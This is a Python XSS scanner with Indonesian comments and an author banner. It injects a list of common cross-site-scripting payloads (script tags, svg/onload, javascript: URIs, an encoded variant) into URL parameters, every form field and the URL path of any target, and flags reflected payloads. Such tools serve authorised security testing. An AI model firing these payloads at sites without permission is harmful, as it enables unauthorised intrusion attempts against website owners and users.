import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
from colorama import init, Fore, Style

# Inisialisasi colorama
init(autoreset=True)

# Daftar payload XSS umum
xss_payloads = [
    "<script>alert(1)</script>",
    "';alert(1);//",
    "\"><script>alert('XSS')</script>",
    "javascript:alert(1)",
    "<IMG SRC=javascript:alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<BODY ONLOAD=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<details open ontoggle=alert(1)>",
    "<a href='javas&#99;ript:alert(1)'>click</a>"
]

def print_intro():
    print(Fore.WHITE + r"""
        ________
       /      /|
      /______/ |         """ + Fore.GREEN + "XSS SCANNER" + Fore.WHITE + """
     |      |  |         """ + Fore.GREEN + "by kotaksuusu" + Fore.WHITE + """
     | MILK |  |      
     | BOX  |  |         
     |      |  |         
     |      | /          
     |______|/     
""" + Style.RESET_ALL)

    print(Fore.YELLOW + "👤 GitHub: " + Fore.GREEN + "Hanif_Albana" + Fore.WHITE + " | " + Fore.MAGENTA + "kotaksuusu\n" + Style.RESET_ALL)

def scan_get_params(url):
    print(Fore.CYAN + "[*] Memindai GET parameter...")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for param in params:
        for payload in xss_payloads:
            new_params = params.copy()
            new_params[param] = payload
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                res = requests.get(new_url, timeout=10)
                if payload in res.text:
                    print(Fore.RED + "\n[!!!] XSS TERDETEKSI via GET parameter! 🚨")
                    print("Parameter:", Fore.YELLOW + param)
                    print("Payload  :", Fore.YELLOW + payload)
                    print("URL      :", Fore.YELLOW + new_url + "\n")
                    return
            except requests.exceptions.RequestException as e:
                print(Fore.RED + "[x] Request error:", e)

def scan_forms(url):
    print(Fore.CYAN + "[*] Memindai semua form GET & POST...")
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")

        for i, form in enumerate(forms):
            action = form.get("action")
            method = form.get("method", "get").lower()
            form_url = requests.compat.urljoin(url, action if action else url)

            inputs = form.find_all(["input", "textarea", "select"])
            data = {}

            for input_field in inputs:
                name = input_field.get("name")
                if name:
                    data[name] = "test"

            for payload in xss_payloads:
                data_payload = {k: payload for k in data}

                try:
                    if method == "post":
                        r = requests.post(form_url, data=data_payload, timeout=10)
                    else:
                        r = requests.get(form_url, params=data_payload, timeout=10)

                    if payload in r.text:
                        print(Fore.RED + "\n[!!!] POTENSI XSS TERDETEKSI! 🔥")
                        print("Form ke- ", Fore.YELLOW + str(i + 1))
                        print("Method  :", Fore.YELLOW + method.upper())
                        print("Payload :", Fore.YELLOW + payload)
                        print("URL     :", Fore.YELLOW + form_url + "\n")
                        return
                except requests.exceptions.RequestException as e:
                    print(Fore.RED + "[x] Request error saat form:", e)

    except requests.exceptions.RequestException as e:
        print(Fore.RED + "[x] Gagal mengambil halaman:", e)

def scan_path(url):
    print(Fore.CYAN + "[*] Memindai path injection...")
    base_url = url.rstrip("/")
    for payload in xss_payloads:
        test_url = f"{base_url}/{payload}"
        try:
            r = requests.get(test_url, timeout=10)
            if payload in r.text:
                print(Fore.RED + "\n[!!!] XSS TERDETEKSI via PATH 💀")
                print("URL     :", Fore.YELLOW + test_url)
                print("Payload :", Fore.YELLOW + payload + "\n")
                return
        except requests.exceptions.RequestException as e:
            print(Fore.RED + "[x] Error saat path injection:", e)

def scan_xss_hybrid(url):
    print(Fore.GREEN + "[+] Target:", url)
    scan_get_params(url)
    scan_forms(url)
    scan_path(url)
    print(Fore.GREEN + "\n[✓] Selesai scanning.\n")

# ===== Entry Point =====
if __name__ == "__main__":
    print_intro()

    if len(sys.argv) < 2:
        input_url = input(Fore.CYAN + "Masukkan URL target (contoh: example.com): " + Style.RESET_ALL).strip()
    else:
        input_url = sys.argv[1].strip()

    if not input_url.startswith("http://") and not input_url.startswith("https://"):
        input_url = "https://" + input_url

    scan_xss_hybrid(input_url)
